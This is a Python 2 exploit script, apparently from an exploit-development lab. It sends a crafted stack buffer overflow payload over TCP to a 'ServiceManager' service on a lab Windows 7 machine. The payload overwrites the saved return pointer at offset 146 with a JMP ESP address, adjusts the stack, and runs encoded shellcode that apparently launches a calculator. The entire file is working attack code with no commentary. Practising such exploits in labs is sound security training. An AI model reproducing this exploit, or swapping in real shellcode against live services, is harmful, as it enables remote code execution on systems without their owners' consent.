#!/usr/bin/python
import socket
import struct

#set up ip and port
ServiceManagerIP = "192.168.150.25"
ServiceManagerPort = 42424

buf_totlen = 400
offset_srp = 146

ptr_jmp_esp = 0x080414c3

sub_esp_10 = "\x83\xec\x10"

shellcode_calc =  ""
shellcode_calc += "\xda\xca\xd9\x74\x24\xf4\xb8\x77\x20\x0f"
shellcode_calc += "\xc9\x5b\x33\xc9\xb1\x31\x31\x43\x18\x03"
shellcode_calc += "\x43\x18\x83\xc3\x73\xc2\xfa\x35\x93\x80"
shellcode_calc += "\x05\xc6\x63\xe5\x8c\x23\x52\x25\xea\x20"
shellcode_calc += "\xc4\x95\x78\x64\xe8\x5e\x2c\x9d\x7b\x12"
shellcode_calc += "\xf9\x92\xcc\x99\xdf\x9d\xcd\xb2\x1c\xbf"
shellcode_calc += "\x4d\xc9\x70\x1f\x6c\x02\x85\x5e\xa9\x7f"
shellcode_calc += "\x64\x32\x62\x0b\xdb\xa3\x07\x41\xe0\x48"
shellcode_calc += "\x5b\x47\x60\xac\x2b\x66\x41\x63\x20\x31"
shellcode_calc += "\x41\x85\xe5\x49\xc8\x9d\xea\x74\x82\x16"
shellcode_calc += "\xd8\x03\x15\xff\x11\xeb\xba\x3e\x9e\x1e"
shellcode_calc += "\xc2\x07\x18\xc1\xb1\x71\x5b\x7c\xc2\x45"
shellcode_calc += "\x26\x5a\x47\x5e\x80\x29\xff\xba\x31\xfd"
shellcode_calc += "\x66\x48\x3d\x4a\xec\x16\x21\x4d\x21\x2d"
shellcode_calc += "\x5d\xc6\xc4\xe2\xd4\x9c\xe2\x26\xbd\x47"
shellcode_calc += "\x8a\x7f\x1b\x29\xb3\x60\xc4\x96\x11\xea"
shellcode_calc += "\xe8\xc3\x2b\xb1\x66\x15\xb9\xcf\xc4\x15"
shellcode_calc += "\xc1\xcf\x78\x7e\xf0\x44\x17\xf9\x0d\x8f"
shellcode_calc += "\x5c\xe5\xef\x1a\xa8\x8e\xa9\xce\x11\xd3"
shellcode_calc += "\x49\x25\x55\xea\xc9\xcc\x25\x09\xd1\xa4"
shellcode_calc += "\x20\x55\x55\x54\x58\xc6\x30\x5a\xcf\xe7"
shellcode_calc += "\x10\x39\x8e\x7b\xf8\x90\x35\xfc\x9b\xec"



# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "BBBB"
buf += sub_esp_10
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf))


#Attempt to send message
try:
    print "Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to Win7 machine
    connect = s.connect((ServiceManagerIP, ServiceManagerPort))
    s.send(buf + '\r\n')
    s.recv(1024)
    s.close()
    
except:
    print "Could not connect"
